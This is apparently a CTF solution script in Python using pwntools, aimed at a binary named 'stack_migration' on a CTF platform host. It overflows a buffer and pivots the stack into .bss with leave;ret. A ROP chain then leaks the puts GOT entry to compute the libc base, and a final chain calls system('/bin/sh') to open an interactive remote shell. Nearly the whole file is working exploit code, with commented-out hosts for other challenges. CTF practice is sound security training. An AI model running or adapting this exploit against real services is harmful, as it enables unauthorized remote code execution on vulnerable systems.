# import time
from pwn import *
# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 9999)
io = remote("node4.buuoj.cn", 29291)
# io = process('./ezpwn')
# gdb.attach(io)
# io = remote("dasctf_sixbytes.node.game.sycsec.com", 30774)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node5.anna.nssctf.cn", 28604)
# io = remote("112.6.51.212", 30362)
# io = remote("8.130.35.16", 51003)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('stack_migration')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r(n):
    return (io.recv(n))
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)
def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

bss = elf.bss(0x700)
pop_rdi_ret = 0x00000000004012b3
pop_rbp_ret = 0x000000000040115d
leave_ret = 0x0000000000401227
ret = 0x000000000040101a

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

pay0 = b'a' * 0x50 + p64(bss + 0x50) + p64(0x4011F3)
ru(b"just chat with me:\n")
s(pay0)
pay = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
pay += p64(pop_rbp_ret) + p64(bss + 0x100 + 0x50) + p64(0x4011F3)
pay = pay.ljust(0x50, b'\x00') + p64(bss - 0x8) + p64(leave_ret)
ru(b"just chat with me:\n")
s(pay)
libc_base = get_addr() - 0x084420
print(hex(libc_base))
sys = libc_base + 0x52290
binsh = libc_base + 0x1B45BD
pay1 = p64(pop_rdi_ret) + p64(binsh) + p64(sys)
pay1 = pay1.ljust(0x50) + p64(bss + 0x100 - 8) + p64(leave_ret)
ru(b"just chat with me:\n")
s(pay1)

inter()

